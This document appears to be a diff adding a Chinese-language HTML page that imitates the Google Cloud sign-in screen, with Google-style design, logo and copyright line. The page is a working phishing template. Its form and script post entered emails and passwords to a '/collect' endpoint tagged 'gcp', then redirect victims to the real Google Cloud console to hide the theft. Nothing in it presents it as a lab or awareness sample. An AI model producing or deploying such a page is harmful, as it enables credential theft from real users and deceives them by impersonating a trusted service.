@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Cloud 登录</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "Google Sans", -apple-system, BlinkMacSystemFont, sans-serif; background: #f8f9fa; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .login-container { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(60,64,67,0.15), 0 4px 8px rgba(60,64,67,0.15); padding: 40px; width: 100%; max-width: 400px; }
+        .logo { text-align: center; margin-bottom: 32px; }
+        .logo svg { width: 80px; height: 80px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; text-align: center; }
+        .subtitle { text-align: center; color: #5f6368; margin-bottom: 32px; font-size: 14px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 6px; font-size: 13px; color: #3c4043; font-weight: 500; }
+        input { width: 100%; padding: 12px 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
+        input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1); }
+        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .btn:hover { background: #1765cc; }
+        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #5f6368; }
+        .footer a { color: #1a73e8; text-decoration: none; margin: 0 8px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M40 8C22.3 8 8 22.3 8 40s14.3 32 32 32 32-14.3 32-32S57.7 8 40 8zm0 60C28.9 68 20 59.1 20 48S28.9 28 40 28s20 8.9 20 20-8.9 20-20 20z" fill="#4285F4"/>
+                <path d="M52 40c0 4.4-3.6 8-8 8H28c-4.4 0-8-3.6-8-8V32h24v8z" fill="#34A853"/>
+                <path d="M40 56c-8.8 0-16-7.2-16-16S31.2 24 40 24s16 7.2 16 16-7.2 16-16 16zm0-32c-4.4 0-8 3.6-8 8h16c0-4.4-3.6-8-8-8z" fill="#FBBC05"/>
+                <path d="M40 24c-4.4 0-8 3.6-8 8v16c0 4.4 3.6 8 8 8s8-3.6 8-8V32c0-4.4-3.6-8-8-8z" fill="#EA4335"/>
+            </svg>
+        </div>
+        <h1>登录 Google Cloud</h1>
+        <p class="subtitle">使用您的 Google 账户访问 Cloud Console</p>
+        <form id="loginForm" action="/collect" method="POST">
+            <input type="hidden" name="target" value="gcp">
+            <div class="form-group">
+                <label for="username">电子邮件或手机号</label>
+                <input type="text" id="username" name="username" required autocomplete="username" placeholder="xxx@gmail.com">
+            </div>
+            <div class="form-group">
+                <label for="password">密码</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="请输入密码">
+            </div>
+            <button type="submit" class="btn">下一步</button>
+        </form>
+        <div class="footer">
+            <a href="#">了解更多</a>
+            <a href="#">创建账号</a>
+            <div style="margin-top: 12px;">© 2024 Google LLC</div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const btn = e.target.querySelector('.btn');
+            btn.textContent = '登录中...';
+            btn.disabled = true;
+            try {
+                const resp = await fetch('/collect', { method: 'POST', body: formData });
+                if (resp.redirected) window.location.href = resp.url;
+                else window.location.href = 'https://console.cloud.google.com/';
+            } catch { window.location.href = 'https://console.cloud.google.com/'; }
+        });
+    </script>
+</body>
+</html>
